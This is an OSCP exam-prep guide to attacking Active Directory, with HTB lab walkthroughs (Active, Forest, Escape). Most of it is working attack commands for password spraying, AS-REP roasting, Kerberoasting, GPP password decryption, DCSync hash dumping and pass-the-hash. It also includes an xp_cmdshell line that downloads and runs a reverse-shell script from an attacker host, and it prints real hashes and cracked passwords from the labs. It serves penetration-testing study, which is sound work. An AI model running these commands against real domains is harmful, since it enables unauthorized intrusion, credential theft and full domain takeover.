# OSCP Active Directory Complete Beginner Guide
*From Zero Knowledge to OSCP Success*

## Table of Contents
1. [Introduction & Prerequisites](#introduction--prerequisites)
2. [Active Directory Fundamentals](#active-directory-fundamentals)
3. [Port Identification & Tool Selection](#port-identification--tool-selection)
4. [Complete Enumeration Methodology](#complete-enumeration-methodology)
5. [Attack Techniques with Detailed Explanations](#attack-techniques-with-detailed-explanations)
6. [TJ Null AD Box Walkthroughs](#tj-null-ad-box-walkthroughs)
7. [Common OSCP AD Scenarios](#common-oscp-ad-scenarios)
8. [Beginner-Friendly Command Reference](#beginner-friendly-command-reference)
9. [Troubleshooting Guide](#troubleshooting-guide)
10. [Exam Strategy & Tips](#exam-strategy--tips)

---

## Introduction & Prerequisites

### What You Need to Know Before Starting
This guide assumes **zero prior knowledge** of Active Directory. If you understand basic networking (what an IP address is) and can use a Linux terminal, you're ready to start.

### Environment Setup
```bash
# Essential environment variables - set these for EVERY AD target
export TARGET=10.10.10.100        # Target machine IP
export DOMAIN=example.local        # Domain name (found during enumeration)
export DC=dc01.example.local       # Domain Controller hostname
export USER=svc_account           # Username you discover/are given
export PASS='Password123!'        # Password you crack/are given
export ATTACKER_IP=10.10.14.1     # Your Kali machine IP

# Why set these? So you don't have to retype long commands constantly
```

---

## Active Directory Fundamentals

### What is Active Directory?
Active Directory (AD) is like a **phone book for a company's network**. It stores:
- **Users** (employees, service accounts)
- **Computers** (workstations, servers)  
- **Groups** (IT team, HR team, Admins)
- **Permissions** (who can access what)

### Key Concepts You Must Understand

#### Domain
Think of a domain like a **company**. Everyone in the company (domain) shares the same rules and can potentially access shared resources.

#### Domain Controller (DC)
The **main server** that manages everything in the domain. It's like the company's HR department - it knows all employees and their permissions.

#### Service Accounts
**Non-human accounts** used by applications and services. These are often:
- Poorly managed (weak passwords)
- Over-privileged (more access than needed)
- **Your path to Domain Admin**

#### Domain Admin
The **CEO-level** access in AD. Can control everything in the domain. Your ultimate goal.

---

## Port Identification & Tool Selection

### How to Know Which Tools to Use

When you run `nmap`, you see **ports** (doors into the machine). Each port tells you which **tools** to use:

#### Port 53 (DNS)
- **What it is**: Domain Name System - translates names to IPs
- **When you see it**: Almost always on Domain Controllers
- **Tools to use**: `dig`, `nslookup`
- **Why**: Can reveal domain name and other domain controllers

#### Port 88 (Kerberos)
- **What it is**: Authentication system used by Windows domains
- **When you see it**: Confirms this is a Domain Controller
- **Tools to use**: `GetNPUsers.py`, `GetUserSPNs.py`
- **Why**: Kerberos tickets contain password hashes you can crack

#### Port 135/593 (RPC)
- **What it is**: Remote Procedure Call - allows remote management
- **When you see it**: Most Windows machines
- **Tools to use**: `rpcclient`
- **Why**: Can enumerate users and groups without credentials

#### Port 139/445 (SMB)
- **What it is**: File sharing protocol (like network folders)
- **When you see it**: Almost all Windows machines
- **Tools to use**: `smbclient`, `smbmap`, `crackmapexec`
- **Why**: Often has misconfigured shares with sensitive files

#### Port 389/636/3268 (LDAP)
- **What it is**: Protocol to query the AD database directly
- **When you see it**: Domain Controllers
- **Tools to use**: `ldapsearch`, `ldapdomaindump`
- **Why**: Can dump entire user/group/computer lists

#### Port 5985/5986 (WinRM)
- **What it is**: Windows Remote Management (remote shell access)
- **When you see it**: Modern Windows machines
- **Tools to use**: `evil-winrm`
- **Why**: Direct shell access if you have credentials

### Decision Tree: Which Tool When?
```
1. Found ports 53, 88, 389, 445? → This is a Domain Controller
2. No credentials yet? → Start with RPC (rpcclient) and SMB (smbclient)
3. Got credentials? → Use LDAP tools and BloodHound
4. Need shell access? → Try WinRM (evil-winrm) or RDP
```

---

## Complete Enumeration Methodology

### Phase 1: Initial Discovery (No Credentials Needed)

#### Step 1: Port Scanning
```bash
# Quick scan to identify services
nmap -sC -sV -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,5986 $TARGET

# Why these ports? They're the most common AD services
```

#### Step 2: SMB Enumeration (Most Important First Step)
```bash
# Check basic SMB info - tells you domain name and computer name
crackmapexec smb $TARGET

# List shares anonymously (no login required)
smbclient -L //$TARGET -N

# Why do this first? SMB often allows anonymous access and can reveal:
# - Domain name
# - Share names (which might contain sensitive files)
# - Computer name
```

**Different SMB Commands and When to Use:**
```bash
# smbclient - Interactive, like FTP
smbclient //$TARGET/ShareName -N  # Use when you want to browse files interactively

# smbmap - Quick overview of permissions
smbmap -H $TARGET -u '' -p ''     # Use to quickly see what shares you can access

# crackmapexec - Advanced features, credential testing
crackmapexec smb $TARGET --shares  # Use when you have credentials to test
```

#### Step 3: RPC Enumeration
```bash
# Connect to RPC without credentials
rpcclient -U '' -N $TARGET

# Once connected, try these commands:
rpcclient $> enumdomusers    # List all domain users
rpcclient $> enumdomgroups   # List all domain groups  
rpcclient $> querydominfo    # Get domain information

# Why RPC? It often allows anonymous connections and reveals user lists
# User lists = targets for password attacks
```

#### Step 4: LDAP Enumeration
```bash
# Test anonymous LDAP access
ldapsearch -x -H ldap://$TARGET -s base namingcontexts

# If this works, LDAP allows anonymous queries - jackpot!
# Extract domain info:
ldapsearch -x -H ldap://$TARGET -b "DC=domain,DC=local"

# Why LDAP? It's the AD database - if you can query it anonymously,
# you can get EVERYTHING (users, groups, computers, passwords policies)
```

### Phase 2: User Discovery & Initial Access

#### Password Spraying (Safest Attack)
```bash
# After getting user list from RPC/LDAP, try common passwords
crackmapexec smb $TARGET -u users.txt -p 'Password123' --continue-on-success
crackmapexec smb $TARGET -u users.txt -p 'Welcome1' --continue-on-success
crackmapexec smb $TARGET -u users.txt -p 'Summer2024' --continue-on-success

# Why these passwords? Most common in corporate environments
# --continue-on-success = don't stop at first hit, find ALL valid accounts
```

#### AS-REP Roasting (No Credentials Needed)
```bash
# Target users who don't require Kerberos pre-authentication
GetNPUsers.py -no-pass -usersfile users.txt $DOMAIN/ -dc-ip $TARGET

# What is AS-REP Roasting?
# Some users have "Do not require Kerberos preauthentication" checked
# This means you can request their password hash WITHOUT knowing their password
# Then crack the hash offline = free password!
```

### Phase 3: Authenticated Enumeration (You Have Credentials)

#### BloodHound Data Collection
```bash
# THE most important tool for AD attacks
bloodhound-python -d $DOMAIN -u $USER -p "$PASS" -ns $TARGET -c All --zip

# What is BloodHound?
# It maps out ALL relationships in AD:
# - Who can access what computers
# - Who can modify which users  
# - Shortest path to Domain Admin
# Think of it as a GPS for AD attacks
```

#### Detailed LDAP Enumeration
```bash
# With credentials, get everything from LDAP
ldapdomaindump ldap://$TARGET -u "$DOMAIN\\$USER" -p "$PASS" -o ldap_dump/

# What does this give you?
# - Complete user list with details
# - Group membership information  
# - Computer accounts
# - Trust relationships
```

#### SMB Share Analysis with Credentials
```bash
# List all shares you can access
crackmapexec smb $TARGET -u $USER -p "$PASS" --shares

# Mount interesting shares
smbclient //$TARGET/SYSVOL -U $DOMAIN\\$USER%$PASS
smbclient //$TARGET/NETLOGON -U $DOMAIN\\$USER%$PASS

# What to look for in shares:
# - Group Policy Preferences (passwords)
# - Scripts with hardcoded credentials
# - Configuration files
# - Backup files
```

---

## Attack Techniques with Detailed Explanations

### 1. AS-REP Roasting

#### What is it?
Some user accounts have "Do not require Kerberos preauthentication" enabled. This is a **misconfiguration** that lets attackers request encrypted password hashes without knowing the password.

#### When to use it?
- **Early in enumeration** (no credentials needed)
- When you have a user list from RPC/LDAP enumeration
- As part of your standard methodology

#### How it works:
```bash
# 1. Find vulnerable users
GetNPUsers.py -no-pass -usersfile users.txt $DOMAIN/ -dc-ip $TARGET

# 2. If you get hashes, crack them
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt --force

# 3. Why does this work?
# Normal Kerberos: User proves identity BEFORE getting ticket
# AS-REP Roasting: Misconfigured accounts give tickets WITHOUT proof
# The ticket contains encrypted password hash = crackable offline
```

### 2. Kerberoasting

#### What is it?
Service accounts often have **Service Principal Names (SPNs)** registered. You can request tickets for these services and crack the passwords offline.

#### When to use it?
- **After you have ANY domain credentials**
- When BloodHound shows "Kerberoastable Users"
- Should be in your standard post-credential workflow

#### How it works:
```bash
# 1. Find service accounts with SPNs
GetUserSPNs.py $DOMAIN/$USER:"$PASS" -dc-ip $TARGET

# 2. Request tickets for these services  
GetUserSPNs.py $DOMAIN/$USER:"$PASS" -dc-ip $TARGET -request

# 3. Crack the tickets
hashcat -m 13100 tgs_hashes.txt /usr/share/wordlists/rockyou.txt --force

# 4. Why does this work?
# Service accounts often have weak passwords but high privileges
# Kerberos tickets are encrypted with the service account's password
# Crack ticket = get service account password = often path to Domain Admin
```

### 3. SMB Share Analysis & GPP Passwords

#### What is it?
Group Policy Preferences used to store passwords in SYSVOL share. Although patched, many environments still have **legacy files with encrypted passwords**.

#### When to use it?
- **Immediately after gaining any SMB access**
- Should be automated in your workflow
- Check SYSVOL and NETLOGON shares first

#### How it works:
```bash
# 1. Access SYSVOL share
smbclient //$TARGET/SYSVOL -U $DOMAIN\\$USER%$PASS

# 2. Download everything (or search for XML files)
recurse on
prompt off  
mget *

# 3. Search for cpassword entries
grep -r "cpassword" . 

# 4. Decrypt any found passwords
gpp-decrypt <encrypted_password>

# 5. Why does this work?
# Microsoft published the encryption key for GPP passwords in 2012
# Anyone can decrypt these passwords
# These passwords are often for privileged accounts
```

### 4. BloodHound Analysis

#### What is it?
BloodHound visualizes **attack paths** in Active Directory by mapping relationships between users, groups, and computers.

#### When to use it?
- **As soon as you have any domain credentials**
- Before attempting manual privilege escalation
- To identify the shortest path to Domain Admin

#### Key Queries for OSCP:
```bash
# After importing data, run these queries:
1. "Shortest Paths to Domain Admins"  # Your main goal
2. "Find Computers where Domain Users can RDP"  # Lateral movement
3. "Users with Local Admin Rights"  # Credential harvesting targets
4. "Kerberoastable Users"  # Service accounts to target

# Custom query for finding easy wins:
MATCH p=shortestPath((u:User)-[*1..]->(g:Group {name: "DOMAIN ADMINS@DOMAIN.LOCAL"})) RETURN p
```

#### What to look for:
- **Green lines** = paths you can exploit
- **Red nodes** = high-value targets (Domain Admins)
- **Computer nodes** = potential lateral movement targets

### 5. DCSync Attack

#### What is it?
DCSync allows you to **impersonate a domain controller** and request password hashes for any user in the domain.

#### When to use it?
- **After you have high privileges** (not beginner attack)
- When BloodHound shows "DCSync Rights"  
- Usually your final attack before full domain compromise

#### How it works:
```bash
# 1. Check if you have DCSync rights
crackmapexec smb $TARGET -u $USER -p "$PASS" --ntds

# 2. If yes, dump all domain hashes
secretsdump.py -just-dc $DOMAIN/$USER:"$PASS"@$TARGET

# 3. Use Administrator hash for Pass-the-Hash
psexec.py $DOMAIN/Administrator@$TARGET -hashes aad3b435b51404eeaad3b435b51404ee:<NTLM_HASH>

# 4. Why does this work?
# Domain Controllers sync password data between each other
# If you have "Replicating Directory Changes" permission,
# you can pretend to be another DC and request all passwords
# This gives you EVERY password hash in the domain
```

---

## TJ Null AD Box Walkthroughs

### Box 1: Active (HTB) - GPP cPassword Attack
**Difficulty: Easy | Key Learning: Group Policy Preferences**

#### Attack Path: SMB → GPP Password → Kerberoasting → Domain Admin

```bash
# Step 1: SMB enumeration (no credentials needed)
smbclient -L //10.10.10.100 -N
# Result: Found "Replication" share with READ access

# Step 2: Connect to share and download files
smbclient //10.10.10.100/Replication -N
smb> recurse on
smb> prompt off
smb> mget *

# Step 3: Search for GPP passwords
find . -name "*.xml" -exec grep -l "cpassword" {} \;
# Result: Found Groups.xml with cpassword

# Step 4: Decrypt the password
gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
# Result: GPPstillStandingStrong2k18

# Step 5: Password spray to find which user has this password
crackmapexec smb 10.10.10.100 -u users.txt -p 'GPPstillStandingStrong2k18'
# Result: SVC_TGS:GPPstillStandingStrong2k18

# Step 6: Kerberoasting with valid credentials
GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -request
# Result: Got Administrator's service ticket

# Step 7: Crack the Kerberos ticket
hashcat -m 13100 ticket.txt /usr/share/wordlists/rockyou.txt
# Result: Ticketmaster1968

# Step 8: psexec as Administrator
psexec.py active.htb/Administrator:'Ticketmaster1968'@10.10.10.100
# Result: SYSTEM shell, game over
```

**Key Lessons:**
- **Always check SYSVOL/Replication shares first**
- **GPP passwords still exist in many environments**
- **Service accounts often have weak passwords**
- **Kerberoasting is extremely effective**

### Box 2: Forest (HTB) - AS-REP Roasting → Exchange ACL Abuse
**Difficulty: Easy | Key Learning: AS-REP Roasting and BloodHound**

#### Attack Path: RPC Enumeration → AS-REP Roasting → BloodHound → Exchange ACL → DCSync

```bash
# Step 1: Enumerate users via RPC (no credentials needed)
rpcclient -U '' -N 10.10.10.161
rpcclient $> enumdomusers | tee users.raw
# Extract usernames
awk -F'[' '{print $2}' users.raw | awk -F']' '{print $1}' > users.txt

# Step 2: AS-REP Roasting
GetNPUsers.py -no-pass -usersfile users.txt htb.local/ -dc-ip 10.10.10.161
# Result: svc-alfresco is vulnerable to AS-REP roasting

# Step 3: Crack AS-REP hash
hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt
# Result: s3rvice

# Step 4: Get shell with credentials
evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice

# Step 5: Run BloodHound collector
bloodhound-python -d htb.local -u svc-alfresco -p s3rvice -ns 10.10.10.161 -c All
# Import into BloodHound and analyze

# Step 6: BloodHound reveals Exchange Windows Permissions → DCSync path
# svc-alfresco is member of "Service Accounts" → "Privileged IT Accounts" → "Account Operators"

# Step 7: Abuse Exchange permissions to grant DCSync rights
# (This requires PowerView or similar tools)
Add-DomainObjectAcl -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity svc-alfresco -Rights DCSync

# Step 8: DCSync attack
secretsdump.py -just-dc htb.local/svc-alfresco:s3rvice@10.10.10.161
# Result: All domain hashes, including Administrator

# Step 9: Pass-the-Hash as Administrator
psexec.py htb.local/Administrator@10.10.10.161 -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
```

**Key Lessons:**
- **AS-REP roasting works without any credentials**
- **BloodHound reveals complex attack paths**
- **Exchange permissions often lead to DCSync**
- **Service accounts in multiple groups = dangerous**

### Box 3: Escape (HTB) - MSSQL → Certificate Template Abuse
**Difficulty: Hard | Key Learning: ADCS (Certificate Services)**

#### Attack Path: MSSQL Login → xp_cmdshell → Certificate Abuse → Domain Admin

```bash
# Step 1: MSSQL enumeration
crackmapexec mssql 10.10.11.202 -u '' -p ''
# Result: Anonymous login allowed

# Step 2: Connect to MSSQL
impacket-mssqlclient sequel.htb/PublicUser:GuestUserCantWrite1@10.10.11.202

# Step 3: Enable xp_cmdshell
SQL> EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
SQL> EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

# Step 4: Get reverse shell via xp_cmdshell
SQL> xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).downloadString(\"http://10.10.14.1/rev.ps1\")"'

# Step 5: Enumerate for certificates
# Check if ADCS is available
certutil -config - -ping
# Result: Certificate Authority found

# Step 6: Find vulnerable certificate templates
Certify.exe find /vulnerable
# Result: UserAuthentication template allows SAN specification

# Step 7: Request certificate as Administrator
Certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:Administrator
# Result: Certificate generated

# Step 8: Convert certificate and authenticate
# Convert to PFX format, then use with Rubeus
Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /password:password /ptt
# Result: Administrator TGT obtained, full domain access
```

**Key Lessons:**
- **MSSQL often has dangerous configurations**
- **ADCS certificate templates can be misconfigured**
- **Certificate authentication bypasses many detections**
- **Always check for certificate services in AD environments**

---

## Common OSCP AD Scenarios

### Scenario 1: Assumed Breach (Most Common in New OSCP)

**You start with domain credentials and need to escalate to Domain Admin**

```bash
# Given: DOMAIN\user:password

# Step 1: Validate credentials work
crackmapexec smb $TARGET -u $USER -p "$PASS"
# ✓ Confirm credentials are valid

# Step 2: Immediate BloodHound collection
bloodhound-python -d $DOMAIN -u $USER -p "$PASS" -ns $TARGET -c All

# Step 3: Check for quick wins while BloodHound runs
# Kerberoasting
GetUserSPNs.py $DOMAIN/$USER:"$PASS" -dc-ip $TARGET -request

# Check shares
crackmapexec smb $TARGET -u $USER -p "$PASS" --shares

# Step 4: Import BloodHound data and find shortest path to DA
# Look for: Shortest Paths to Domain Admins

# Step 5: Follow the path BloodHound shows you
# Common paths:
# - User → Local Admin on Computer → Dump credentials → Domain Admin
# - User → WriteDACL on other User → Change password → Domain Admin  
# - User → GenericAll on Computer → RBCD attack → Domain Admin
```

### Scenario 2: Web Application → Domain Controller

**Initial foothold through web app, pivot to AD**

```bash
# You have: Shell on web server (often as IIS_USER or similar)

# Step 1: Check if machine is domain-joined
echo %USERDOMAIN%
whoami /all

# Step 2: If domain-joined, enumerate domain
net user /domain
net group "Domain Admins" /domain

# Step 3: Hunt for credentials on the web server
# Check IIS logs, web.config, connection strings
findstr /si password *.config
findstr /si connection *.config

# Step 4: If found credentials, pivot to AD attacks
# Use any domain credentials you find for:
# - BloodHound collection
# - Kerberoasting  
# - LDAP enumeration

# Step 5: If no creds found, look for other domain machines
# Port scan internal network from compromised web server
for /L %i in (1,1,254) do @ping -n 1 -w 200 192.168.1.%i > nul && echo 192.168.1.%i is alive
```

### Scenario 3: Service Account Compromise

**Common pattern: Weak service account leads to domain admin**

```bash
# You find: Service account credentials (often through Kerberoasting)

# Step 1: Check service account privileges
# Service accounts often have:
# - Local admin rights on multiple servers
# - High privileges in AD
# - Scheduled task permissions

# Step 2: Use BloodHound to map service account permissions
# Look for:
# - Computers where account is local admin
# - High-privilege groups account is member of
# - DCSync rights

# Step 3: Leverage service account privileges
# If local admin on servers → dump credentials → find Domain Admin
# If backup privileges → backup AD database → extract all hashes
# If DCSync rights → immediate domain compromise
```

---

## Beginner-Friendly Command Reference

### SMB Enumeration Commands

#### smbclient (Interactive file browser)
```bash
# List shares anonymously
smbclient -L //$TARGET -N
# When to use: First SMB enumeration, no credentials

# Connect to specific share
smbclient //$TARGET/ShareName -N
# When to use: Browse files interactively, download specific files

# Connect with credentials  
smbclient //$TARGET/ShareName -U $DOMAIN\\$USER%$PASS
# When to use: After getting credentials, need to browse files

# Useful smbclient commands once connected:
# ls                 - list files
# cd directory       - change directory
# get filename       - download single file
# recurse on         - enable recursive operations
# prompt off         - disable prompts
# mget *             - download everything
```

#### smbmap (Quick permissions overview)
```bash
# Check anonymous access
smbmap -H $TARGET -u '' -p ''
# When to use: Quick check of share permissions without credentials

# Check with credentials
smbmap -H $TARGET -u $USER -p $PASS
# When to use: After getting credentials, want quick overview

# Recursive listing
smbmap -H $TARGET -u $USER -p $PASS -R
# When to use: Need to see all files in all shares quickly
```

#### crackmapexec (Advanced SMB testing)
```bash
# Basic SMB info
crackmapexec smb $TARGET
# When to use: Get basic info about target (OS, domain name)

# Test credentials
crackmapexec smb $TARGET -u $USER -p $PASS
# When to use: Validate if credentials work

# List shares with credentials
crackmapexec smb $TARGET -u $USER -p $PASS --shares
# When to use: After getting credentials, see accessible shares

# Password spraying
crackmapexec smb $TARGET -u users.txt -p 'Password123' --continue-on-success
# When to use: Have user list, trying common passwords
```

### LDAP Enumeration Commands

#### ldapsearch (Direct LDAP queries)
```bash
# Test anonymous access
ldapsearch -x -H ldap://$TARGET -s base namingcontexts
# When to use: First LDAP test to see if anonymous queries allowed
# What it tells you: If successful, you can query AD database anonymously

# Get domain info
ldapsearch -x -H ldap://$TARGET -b "DC=domain,DC=local"
# When to use: After confirming anonymous access works
# What it gives you: Basic domain structure

# Search for users with credentials
ldapsearch -x -H ldap://$TARGET -D "$DOMAIN\\$USER" -w "$PASS" -b "DC=domain,DC=local" "(objectClass=user)"
# When to use: Have credentials, want user list with details
```

#### ldapdomaindump (Automated LDAP enumeration)
```bash
# Dump everything from LDAP
ldapdomaindump ldap://$TARGET -u "$DOMAIN\\$USER" -p "$PASS" -o ldap_dump/
# When to use: Have credentials, want complete AD database dump
# What it gives you: HTML pages with users, groups, computers, etc.
```

### Kerberos Attack Commands

#### GetNPUsers.py (AS-REP Roasting)
```bash
# Target specific users
GetNPUsers.py -no-pass -usersfile users.txt $DOMAIN/ -dc-ip $TARGET
# When to use: Have user list, no credentials yet
# What it does: Finds users with "Do not require Kerberos preauthentication"

# Output to file for cracking
GetNPUsers.py -no-pass -usersfile users.txt $DOMAIN/ -dc-ip $TARGET -outputfile asrep.hash
# When to use: Found vulnerable users, want to save hashes for cracking
```

#### GetUserSPNs.py (Kerberoasting)
```bash
# Find service accounts
GetUserSPNs.py $DOMAIN/$USER:"$PASS" -dc-ip $TARGET
# When to use: Have credentials, looking for service accounts to target

# Request tickets
GetUserSPNs.py $DOMAIN/$USER:"$PASS" -dc-ip $TARGET -request -outputfile tgs.hash
# When to use: Found service accounts, want to get crackable tickets
```

### Post-Exploitation Commands

#### secretsdump.py (Credential dumping)
```bash
# DCSync attack (dump all domain hashes)
secretsdump.py -just-dc $DOMAIN/$USER:"$PASS"@$TARGET
# When to use: Have DCSync rights, want all domain password hashes

# Target specific user
secretsdump.py -just-dc-user Administrator $DOMAIN/$USER:"$PASS"@$TARGET
# When to use: Only need specific user's hash
```

#### evil-winrm (Remote shell)
```bash
# Connect with password
evil-winrm -i $TARGET -u $USER -p $PASS
# When to use: Port 5985/5986 open, have credentials

# Connect with hash
evil-winrm -i $TARGET -u $USER -H $NTLM_HASH
# When to use: Have NTLM hash from secretsdump, want shell
```

---

## Troubleshooting Guide

### Common Errors and Solutions

#### "Clock skew too great" Error
```bash
# Problem: Your system time differs too much from target
# Solution: Sync time with domain controller
sudo ntpdate -s $TARGET
# Or set time manually:
sudo timedatectl set-time "2024-01-15 14:30:00"
```

#### "KDC_ERR_PREAUTH_FAILED" Error
```bash
# Problem: Wrong username/password for Kerberos
# Solution 1: Verify credentials with SMB first
crackmapexec smb $TARGET -u $USER -p $PASS

# Solution 2: Try different password formats
# Some tools want password in quotes, others don't
```

#### BloodHound "No Data" Issues
```bash
# Problem: BloodHound collection fails or shows no data
# Solution 1: Use IP instead of hostname
bloodhound-python -d $DOMAIN -u $USER -p "$PASS" -ns $TARGET -c All

# Solution 2: Check credentials are valid
crackmapexec ldap $TARGET -u $USER -p "$PASS"

# Solution 3: Use different collector
# Download SharpHound.exe and run on Windows target
```

#### "Access Denied" Errors
```bash
# Problem: Commands fail with access denied
# Check 1: Are you using domain format correctly?
# Right: DOMAIN\\username or username@domain.local
# Wrong: just username

# Check 2: Is the account locked out?
crackmapexec smb $TARGET -u $USER -p $PASS --continue-on-success

# Check 3: Try different authentication methods
# Some tools need NTLM, others need Kerberos
```

### Network Connectivity Issues

#### VPN/Network Problems
```bash
# Test basic connectivity
ping $TARGET

# Test specific ports
nc -zv $TARGET 445
nc -zv $TARGET 389

# Check your routes
route -n
ip route
```

#### DNS Resolution Issues  
```bash
# Add domain controller to /etc/hosts
echo "$TARGET dc.domain.local" >> /etc/hosts

# Test DNS queries
nslookup domain.local $TARGET
dig @$TARGET domain.local
```

---

## Exam Strategy & Tips

### Time Management for OSCP Exam

#### First 2 Hours: Setup and Initial Assessment
- [ ] Set up environment variables for all targets
- [ ] Start nmap scans on all machines
- [ ] Identify which machine is the Domain Controller
- [ ] Begin AD enumeration while other scans run

#### Hours 2-8: AD Set Focus (40 points)
- [ ] Complete enumeration methodology
- [ ] Try AS-REP roasting (works without credentials)
- [ ] Password spray if you find users  
- [ ] Run BloodHound as soon as you get credentials
- [ ] Follow BloodHound's shortest path to Domain Admin

#### Key Success Strategies

1. **Start with AD Set**
   - AD is often easier with assumed breach scenario
   - 40 points gets you more than halfway to passing
   - Builds confidence for standalone machines

2. **Follow the Methodology**
   - Don't skip enumeration steps
   - Each phase builds on the previous
   - Document everything as you go

3. **Use BloodHound Immediately**
   - As soon as you have any domain credentials
   - Shows you the exact path to Domain Admin
   - Saves hours of manual enumeration

4. **Common OSCP AD Patterns**
   - AS-REP roasting → credential → BloodHound → privilege escalation
   - GPP passwords in SYSVOL → service account → Kerberoasting
   - Assumed breach → BloodHound → ACL abuse → DCSync

### What's Actually Tested in OSCP AD

#### Definitely Know:
- SMB enumeration (shares, permissions)
- AS-REP roasting (GetNPUsers.py)
- Kerberoasting (GetUserSPNs.py) 
- BloodHound basics (collection, queries, attack paths)
- Basic privilege escalation (WriteDACL, GenericAll)
- Pass-the-hash attacks
- GPP password decryption

#### Probably Won't See:
- Complex ADCS certificate attacks
- Golden/Silver ticket attacks
- Advanced persistence techniques
- Cross-forest attacks
- Detailed forensics

#### Focus Your Study Time:
- **80% time**: Enumeration, BloodHound, basic attacks
- **20% time**: Advanced techniques for post-OSCP learning

---

## Final Exam Checklist

### Before Starting AD Set:
- [ ] Environment variables set
- [ ] BloodHound ready to use
- [ ] Wordlists prepared (rockyou.txt, common passwords)
- [ ] All impacket tools working
- [ ] Time synced with target

### During AD Enumeration:
- [ ] Port scan completed and analyzed
- [ ] SMB shares enumerated
- [ ] User list obtained (RPC, LDAP, or given)
- [ ] AS-REP roasting attempted
- [ ] Password spraying attempted (if safe)

### After Getting Credentials:
- [ ] Credentials validated with multiple tools
- [ ] BloodHound data collected
- [ ] Attack paths identified
- [ ] Kerberoasting completed
- [ ] Share analysis done

### Before Moving to Next Phase:
- [ ] All attack vectors attempted
- [ ] Screenshots taken
- [ ] Notes documented
- [ ] Next steps identified

Remember: **OSCP AD is about methodology, not memory**. Follow your process, use your tools systematically, and document everything. The exam rewards consistent, methodical approaches over trying to remember complex exploits.

Good luck with your OSCP journey!